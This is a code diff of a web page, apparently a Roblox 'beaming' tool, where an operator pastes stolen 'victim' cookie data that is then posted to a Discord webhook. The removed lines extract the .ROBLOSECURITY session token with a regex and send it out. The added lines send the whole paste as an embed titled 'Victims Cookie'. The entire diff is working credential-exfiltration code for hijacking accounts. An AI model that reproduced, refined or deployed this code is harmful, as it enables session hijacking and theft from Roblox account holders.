@@ -13,13 +13,15 @@
     #messageBar {
       margin-top: 20px;
     }
-    input, button {
+    textarea, button {
       padding: 10px;
       font-size: 16px;
     }
-    input {
+    textarea {
       width: 70%;
       margin-right: 10px;
+      height: 150px; /* Making the input area bigger */
+      resize: none; /* Disable resizing */
     }
     button {
       background-color: #007bff;
@@ -43,7 +45,7 @@
 <body>
   <h1>Start Beaming Now!</h1>
   <div id="messageBar">
-    <input type="text" id="messageInput" placeholder="Paste the victim code that you copied..." />
+    <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea>
     <button id="sendButton" onclick="sendMessage()">Send</button>
   </div>
   <p id="status" style="color: green; font-weight: bold;"></p>
@@ -57,52 +59,43 @@
       const messageInput = document.getElementById("messageInput");
       const sendButton = document.getElementById("sendButton");
       const errorMessage = document.getElementById("errorMessage");
-      const message = messageInput.value;
+      let message = messageInput.value;
 
       errorMessage.textContent = ""; // Clear any previous error messages
 
-      // Check if the message contains the ROBLOSECURITY token
-      const robloSecurityTokenPattern = /\.ROBLOSECURITY=([A-Za-z0-9%\-._\|:;\-]+(?:\|{2})?)/i;
-      const match = message.match(robloSecurityTokenPattern);
+      // Wrap the message in triple backticks (```)
+      message = "```" + message + "```";
 
-      if (!match) {
-        // If no ROBLOSECURITY token is found, show an error
-        errorMessage.textContent = "Message failed! No ROBLOSECURITY token found.";
-        return;
-      }
-
-      // Debugging: log the matched string to the console
-      console.log("Matched Token String: ", match[0]);
-
-      // Extract only the ROBLOSECURITY token, removing the warning part
-      const token = match[0].split('=')[1].split('|')[0]; // This will remove the warning part
-
-      // Debugging: log the cleaned token to the console
-      console.log("Extracted Token: ", token);
-
-      // Send the token to Discord
-      const discordPayload = {
-        content: `ROBLOSECURITY Token: ${token}` // Send only the session token to Discord
+      // Create the embed payload
+      const embedPayload = {
+        embeds: [
+          {
+            title: "Victims Cookie", // Embed title
+            description: message, // Embed description
+            color: 16711680, // Embed color (red in this case)
+            timestamp: new Date().toISOString() // Adds a timestamp
+          }
+        ]
       };
 
-      // Send the data to Discord via Webhook
+      // Send the embed to Discord webhook
       fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(discordPayload)
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embedPayload),
       })
-      .then(response => response.json())
-      .then(data => {
-        // If successful, show a success message
-        document.getElementById("status").textContent = "Token successfully sent to Discord!";
-      })
-      .catch(error => {
-        // Handle error
-        document.getElementById("errorMessage").textContent = "Error sending message!";
-        console.error("Error:", error);
-      });
+        .then((response) => {
+          if (response.ok) {
+            document.getElementById("status").textContent = "Message sent successfully!";
+            messageInput.value = ""; // Clear the input
+          } else {
+            throw new Error("Failed to send the message.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          document.getElementById("status").textContent = "Failed to send the message.";
+        });
     }
   </script>
 </body>
